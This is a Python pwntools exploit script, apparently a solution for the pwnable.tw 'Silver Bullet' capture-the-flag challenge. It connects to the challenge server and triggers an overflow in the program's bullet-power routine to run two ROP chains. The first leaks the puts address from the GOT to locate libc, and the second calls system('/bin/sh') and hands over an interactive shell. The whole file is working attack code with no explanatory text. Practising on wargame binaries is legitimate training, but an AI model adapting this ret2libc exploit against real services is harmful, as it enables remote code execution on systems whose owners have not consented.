from pwn import *

elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')

context.binary = elf

r = remote('chall.pwnable.tw', 10103)


def skip_menu():
    r.recvuntil('+++++++++++++++++++++++++++')
    r.recvuntil('+++++++++++++++++++++++++++')
    r.recvuntil('+++++++++++++++++++++++++++')


def create_bullet(d):
    r.recvuntil(' :')
    r.write('1')
    r.recvuntil(' :')
    r.write(d)
    skip_menu()


def power_up(d):
    r.recvuntil(' :')
    r.write('2')
    r.recvuntil(' :')
    r.write(d)
    skip_menu()


def beat():
    r.recvuntil(' :')
    r.write('3')


rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

print(rop.dump())

create_bullet('A' * 0x2F)
power_up('A')
power_up('A' * 7 + str(rop))

beat()
skip_menu()
beat()

r.recvuntil('!!\x0a')
ADDR_PUTS = u32(r.recv(4))

LIBC_BASE = ADDR_PUTS - libc.symbols['puts']
ADDR_BINSH = libc.search('/bin/sh').next() + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

log.info('puts address: ' + hex(ADDR_PUTS))
log.info('Libc base address: ' + hex(LIBC_BASE))
log.info('System address: ' + hex(ADDR_SYSTEM))
log.info('`/bin/sh` address: ' + hex(ADDR_BINSH))

rop = ROP(elf)
rop.call(ADDR_SYSTEM, [ADDR_BINSH])

create_bullet('A' * 0x2F)
power_up('A')

power_up('A' * 7 + str(rop))

print(rop.dump())

beat()
skip_menu()
beat()

r.interactive()
